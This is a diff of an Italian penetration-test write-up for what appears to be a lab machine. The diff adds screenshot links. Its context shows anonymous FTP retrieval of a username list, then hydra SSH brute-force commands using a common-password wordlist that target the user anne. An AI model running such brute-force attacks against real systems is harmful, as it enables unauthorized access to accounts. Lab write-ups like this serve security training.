@@ -171,6 +171,7 @@ ftp> ls
 -rw-r--r--    1 0        0              31 Mar 03  2018 users.txt.bk
 ftp> get users.txt.bk
 ```
+![Testo alternativo](IMG/4_ftp_anonymous.png)
 
 **Content of users.txt.bk:**
 ```
@@ -180,6 +181,7 @@ mai
 anne
 doomguy
 ```
+![Testo alternativo](IMG/5_users_txt.png)
 
 **Impatto:**  
 Information disclosure critico - la lista di utenti validi del sistema è stata esposta tramite FTP anonimo. Questa informazione può essere utilizzata per attacchi di brute force mirati.
@@ -207,6 +209,7 @@ hydra -L users.txt.bk -P /usr/share/seclists/Passwords/Common-Credentials/500-wo
 ```
 [ERROR] target ssh://192.168.50.9:22/ does not support password authentication (method reply 4).
 ```
+![Testo alternativo](IMG/6_hydra_error.png)
 
 **Causa Principale:**  
 Molte configurazioni SSH limitano il numero di tentativi di autenticazione paralleli. È stato necessario ridurre il numero di task paralleli.
@@ -224,6 +227,7 @@ ssh mai@192.168.50.9      # Permission denied (publickey)
 ssh anne@192.168.50.9     # Password prompt received
 ssh doomguy@192.168.50.9  # Permission denied (publickey)
 ```
+![Testo alternativo](IMG/7_ssh_manual_test.png)
 
 **Risultato Chiave:**  
 Solo l'utente **anne** accetta l'autenticazione tramite password, gli altri utenti richiedono autenticazione a chiave pubblica.
@@ -245,6 +249,7 @@ This session may be vulnerable to "store now, decrypt later" attacks.
 hydra -l anne -P /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt \
 192.168.50.9 ssh -t 4 -V -C
 ```
+![Testo alternativo](IMG/8_anne_hydra.png)
 
 **Parametri:**
 - `-l anne`: singolo username
